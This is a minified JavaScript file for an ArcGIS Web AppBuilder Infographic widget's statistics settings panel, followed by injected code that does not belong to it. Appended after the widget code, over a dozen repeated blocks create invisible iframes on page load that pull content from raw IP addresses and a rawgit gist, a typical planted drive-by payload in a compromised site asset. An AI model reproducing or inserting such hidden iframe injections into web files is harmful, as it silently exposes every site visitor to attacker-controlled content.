// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Infographic/setting/dijitsSetting/_dijits/SingleNumberStatistics.html":'\x3cdiv class\x3d"style-selector"\x3e\r\n  \x3cdiv class\x3d"setting-items clearFix"\x3e\r\n    \x3cdiv class\x3d"label jimu-float-leading" title\x3d"${nls.dataFormat}"\x3e${nls.dataFormat}\x3c/div\x3e\r\n    \x3cdiv class\x3d"setting-wapper jimu-float-trailing clearFix data-formats"\x3e\r\n      \x3cinput type\x3d"radio" value\x3d"Features" id\x3d"Features" name\x3d"dataType" data-dojo-type\x3d"dijit/form/RadioButton" data-dojo-attach-point\x3d"featuresRadion"\x3e\r\n      \x3clabel for\x3d"count" title\x3d"${nls.featureCount}"\x3e${nls.featureCount}\x3c/label\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"setting-items clearFix field-statistics-wapper"\x3e\r\n    \x3cdiv class\x3d"setting-wapper jimu-float-trailing clearFix data-formats"\x3e\r\n      \x3cinput type\x3d"radio" value\x3d"FeatureStatistics" id\x3d"FeatureStatistics" name\x3d"dataType" data-dojo-type\x3d"dijit/form/RadioButton"\r\n        data-dojo-attach-point\x3d"featureStatisticsRadion"\x3e\r\n      \x3clabel for\x3d"statistics" title\x3d"${nls.fieldStatistics}"\x3e${nls.fieldStatistics}\x3c/label\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\r\n  \x3cdiv data-dojo-attach-point\x3d"countRadioBtn"\x3e\r\n    \x3cdiv class\x3d"setting-items clearFix"\x3e\r\n      \x3cdiv class\x3d"label jimu-float-leading" title\x3d"${nls.field}"\x3e${nls.field}\x3c/div\x3e\r\n      \x3cdiv class\x3d"setting-wapper jimu-float-trailing clearFix"\x3e\r\n        \x3cselect data-dojo-type\x3d"dijit/form/Select" data-dojo-props\x3d\'style:{width:"100%"}\' data-dojo-attach-point\x3d"fieldSelect"\x3e\x3c/select\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"setting-items clearFix" data-dojo-attach-point\x3d"operationNode"\x3e\r\n      \x3cdiv class\x3d"label jimu-float-leading" title\x3d"${nls.operation}"\x3e${nls.operation}\x3c/div\x3e\r\n      \x3cdiv class\x3d"setting-wapper jimu-float-trailing clearFix"\x3e\r\n        \x3cselect data-dojo-type\x3d"dijit/form/Select" data-dojo-props\x3d\'style:{width:"100%"}\' data-dojo-attach-point\x3d"operationSelect"\x3e\x3c/select\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/_base/lang dojo/on dojo/_base/html dojo/_base/array jimu/LayerInfos/LayerInfos dojo/Deferred dojo/Evented dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./SingleNumberStatistics.html jimu/dijit/Message dijit/form/RadioButton dijit/form/Select".split(" "),function(k,c,e,h,f,l,m,n,p,q,r,t,u){return k([p,q,r,n],{baseClass:"single-number-statistics",templateString:t,nls:null,_STATISTICSTYPES:null,_DEFAULT_CONFIG:null,dataSource:null,postCreate:function(){this.inherited(arguments);
this._STATISTICSTYPES=[{value:"sum",label:this.nls.sumOption},{value:"avg",label:this.nls.averageOption},{value:"max",label:this.nls.maxOption},{value:"min",label:this.nls.minOption}];this._DEFAULT_CONFIG={type:"",fieldName:null,statisticsType:""};this.config=c.mixin(this._DEFAULT_CONFIG,this.config);""===this.config.type&&(this.config.type="Features",this._setRadionBtnChecked(this.featuresRadion,!0));this.own(e(this.featuresRadion,"change",c.hitch(this,function(a){this._setRadionBtnChecked(this.featuresRadion,
a)})));this.own(e(this.featureStatisticsRadion,"change",c.hitch(this,function(a){this._setRadionBtnChecked(this.featureStatisticsRadion,a)})));this.own(e(this.fieldSelect,"change",c.hitch(this,function(a){if(this.config.fieldName!==a)this.onSettingChange(c.mixin(this.config,{fieldName:a}))})))},startup:function(){this.inherited(arguments);this.setConfig(this.config);this.refresh()},_setRadionBtnChecked:function(a,b){if(a&&"undefined"!==typeof a.setChecked&&(a.setChecked(b),!0===b&&("Features"===a.id?
h.addClass(this.countRadioBtn,"hide"):"FeatureStatistics"===a.id&&h.removeClass(this.countRadioBtn,"hide"),this.config.type!==a.id)))this.onSettingChange(c.mixin(this.config,{type:a.id}))},_getFieldsByType:function(){var a=new m,b=[];if(this.dataSource&&"undefined"!==typeof this.dataSource.dataSourceType)if("DATA_SOURCE_FEATURE_LAYER_FROM_MAP"===this.dataSource.dataSourceType){var d=l.getInstanceSync().getLayerInfoById(this.dataSource.layerId);d&&d.getLayerObject()?d.getLayerObject().then(c.hitch(this,
function(c){b=c.fields;a.resolve(this._getNumberFields(b))})):a.resolve(b)}else if("DATA_SOURCE_FROM_FRAMEWORK"===this.dataSource.dataSourceType){var g=window.appConfig.dataSource.dataSources[this.dataSource.frameWorkDsId],b=g.dataSchema.fields;g.dataSchema.groupByFields&&0<g.dataSchema.groupByFields.length&&(b=f.filter(b,function(a){return a.name!==g.dataSchema.groupByFields[0]}));a.resolve(this._getNumberFields(b))}else a.resolve(b);else a.resolve(b);return a},_getNumberFields:function(a){var b=
["esriFieldTypeSmallInteger","esriFieldTypeInteger","esriFieldTypeSingle","esriFieldTypeDouble"];return f.filter(a,function(a){return-1<b.indexOf(a.type)})},_getTypeInAppConfigByDataSourceType:function(){var a=window.appConfig.dataSource.dataSources[this.dataSource.frameWorkDsId],b="";a.type&&(b=a.type);return b},onSettingChange:function(a){this.config=c.mixin(this.config,a);this.onChange(this.config)},onChange:function(a){this.emit("change",a)},refresh:function(){this.onSettingChange({})},isValid:function(){var a=
"";""===this.config.type&&(a="dataFormat");"Features"!==this.config.type&&this.dataSource&&(""===this.config.fieldName||null===this.config.fieldName?a="field":""===this.config.statisticsType&&(a="operation"));if(a){var b=new u({message:this.nls.requiredFieldWarning+this.nls[a],buttons:[{label:this.nls.ok,onClick:c.hitch(this,function(){b.content=null;b.close()})}]});return!1}return!0},getConfig:function(){return this.isValid()?this.config:!1},setDataSource:function(a){a&&this.config&&(this.dataSource=
a,this._initUI())},setConfig:function(a){"undefined"!==typeof a&&this.dataSource&&(this.config=a,this._initUI())},_initUI:function(){this.config.type&&("Features"===this.config.type?this._setRadionBtnChecked(this.featuresRadion,!0):"FeatureStatistics"===this.config.type&&this._setRadionBtnChecked(this.featureStatisticsRadion,!0));this.config.statisticsType&&this.operationSelect.set("value",this.config.statisticsType);this._getFieldsByType().then(c.hitch(this,function(a){this.fieldSelect.removeOption(this.fieldSelect.getOptions());
var b=!1;f.forEach(a,c.hitch(this,function(a){this.fieldSelect.addOption({value:a.name,label:a.alias});a.name===this.config.fieldName&&(b=!0)}));var d;b?d=this.config.fieldName:a[0]&&"undefined"!==a[0].name&&(d=a[0].name,this.config.fieldName=d);d&&this.fieldSelect.set("value",d)}));this._initOperationSelect()},_initOperationSelect:function(){this.operationSelect.removeOption(this.operationSelect.getOptions());f.forEach(this._STATISTICSTYPES,c.hitch(this,function(a){this.operationSelect.addOption({value:a.value,
label:a.label})}));this.own(e(this.operationSelect,"change",c.hitch(this,function(a){if(this.config.statisticsType!==a)this.onSettingChange(c.mixin(this.config,{statisticsType:a}))})));""===this.config.statisticsType?this.operationSelect.set("value",this.operationSelect.getOptions()[0].value):this.operationSelect.set("value",this.config.statisticsType)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});